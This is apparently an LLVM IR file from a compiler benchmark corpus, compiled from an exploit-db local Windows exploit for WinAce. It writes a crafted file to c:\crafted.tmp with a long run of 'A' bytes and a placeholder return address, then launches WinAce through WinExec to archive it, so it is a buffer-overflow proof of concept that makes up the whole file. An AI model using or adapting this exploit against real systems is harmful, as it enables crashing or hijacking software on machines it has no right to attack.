; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_1168.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_1168.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.tmpfile = private unnamed_addr constant [15 x i8] c"c:\\crafted.tmp\00", align 1
@__const.main.winacepath = private unnamed_addr constant [37 x i8] c"\22C:\\Program Files\\WinAce\\winace.exe\22\00", align 16
@__const.main.compresspar = private unnamed_addr constant [38 x i8] c" a \22C:\\Program Files\\WinAce\\winace\22 @\00", align 16
@__const.main.Ret_Addr = private unnamed_addr constant [5 x i8] c"1234\00", align 1
@.str = private unnamed_addr constant [3 x i8] c"wb\00", align 1
@.str.1 = private unnamed_addr constant [4 x i8] c"c:\\\00", align 1
@.str.2 = private unnamed_addr constant [7 x i8] c".txt\0D\0A\00", align 1
@SW_SHOW = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main() #0 {
  %1 = alloca [15 x i8], align 1
  %2 = alloca [37 x i8], align 16
  %3 = alloca [38 x i8], align 16
  %4 = alloca [300 x i8], align 16
  %5 = alloca i32, align 4
  %6 = alloca [5 x i8], align 1
  %7 = alloca i32*, align 8
  %8 = bitcast [15 x i8]* %1 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %8, i8* align 1 getelementptr inbounds ([15 x i8], [15 x i8]* @__const.main.tmpfile, i32 0, i32 0), i64 15, i1 false)
  %9 = bitcast [37 x i8]* %2 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %9, i8* align 16 getelementptr inbounds ([37 x i8], [37 x i8]* @__const.main.winacepath, i32 0, i32 0), i64 37, i1 false)
  %10 = bitcast [38 x i8]* %3 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %10, i8* align 16 getelementptr inbounds ([38 x i8], [38 x i8]* @__const.main.compresspar, i32 0, i32 0), i64 38, i1 false)
  store i32 0, i32* %5, align 4
  %11 = bitcast [5 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %11, i8* align 1 getelementptr inbounds ([5 x i8], [5 x i8]* @__const.main.Ret_Addr, i32 0, i32 0), i64 5, i1 false)
  %12 = getelementptr inbounds [300 x i8], [300 x i8]* %4, i64 0, i64 0
  %13 = getelementptr inbounds [37 x i8], [37 x i8]* %2, i64 0, i64 0
  %14 = call i32 @strcpy(i8* %12, i8* %13)
  %15 = getelementptr inbounds [300 x i8], [300 x i8]* %4, i64 0, i64 0
  %16 = getelementptr inbounds [38 x i8], [38 x i8]* %3, i64 0, i64 0
  %17 = call i32 @strcat(i8* %15, i8* %16)
  %18 = getelementptr inbounds [300 x i8], [300 x i8]* %4, i64 0, i64 0
  %19 = getelementptr inbounds [15 x i8], [15 x i8]* %1, i64 0, i64 0
  %20 = call i32 @strcat(i8* %18, i8* %19)
  %21 = getelementptr inbounds [15 x i8], [15 x i8]* %1, i64 0, i64 0
  %22 = call i32* @fopen(i8* %21, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0))
  store i32* %22, i32** %7, align 8
  %23 = icmp eq i32* %22, null
  br i1 %23, label %24, label %25

24:                                               ; preds = %0
  br label %58

25:                                               ; preds = %0
  %26 = load i32*, i32** %7, align 8
  %27 = call i32 @fprintf(i32* %26, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.1, i64 0, i64 0))
  store i32 0, i32* %5, align 4
  br label %28

28:                                               ; preds = %34, %25
  %29 = load i32, i32* %5, align 4
  %30 = icmp slt i32 %29, 2013
  br i1 %30, label %31, label %37

31:                                               ; preds = %28
  %32 = load i32*, i32** %7, align 8
  %33 = call i32 @fputc(i32 65, i32* %32)
  br label %34

34:                                               ; preds = %31
  %35 = load i32, i32* %5, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %5, align 4
  br label %28

37:                                               ; preds = %28
  %38 = load i32*, i32** %7, align 8
  %39 = getelementptr inbounds [5 x i8], [5 x i8]* %6, i64 0, i64 0
  %40 = call i32 @fprintf(i32* %38, i8* %39)
  store i32 0, i32* %5, align 4
  br label %41

41:                                               ; preds = %47, %37
  %42 = load i32, i32* %5, align 4
  %43 = icmp slt i32 %42, 178
  br i1 %43, label %44, label %50

44:                                               ; preds = %41
  %45 = load i32*, i32** %7, align 8
  %46 = call i32 @fputc(i32 65, i32* %45)
  br label %47

47:                                               ; preds = %44
  %48 = load i32, i32* %5, align 4
  %49 = add nsw i32 %48, 1
  store i32 %49, i32* %5, align 4
  br label %41

50:                                               ; preds = %41
  %51 = load i32*, i32** %7, align 8
  %52 = call i32 @fprintf(i32* %51, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0))
  %53 = load i32*, i32** %7, align 8
  %54 = call i32 @fclose(i32* %53)
  %55 = getelementptr inbounds [300 x i8], [300 x i8]* %4, i64 0, i64 0
  %56 = load i32, i32* @SW_SHOW, align 4
  %57 = call i32 @WinExec(i8* %55, i32 %56)
  br label %58

58:                                               ; preds = %50, %24
  ret void
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @strcpy(i8*, i8*) #2

declare dso_local i32 @strcat(i8*, i8*) #2

declare dso_local i32* @fopen(i8*, i8*) #2

declare dso_local i32 @fprintf(i32*, i8*) #2

declare dso_local i32 @fputc(i32, i32*) #2

declare dso_local i32 @fclose(i32*) #2

declare dso_local i32 @WinExec(i8*, i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
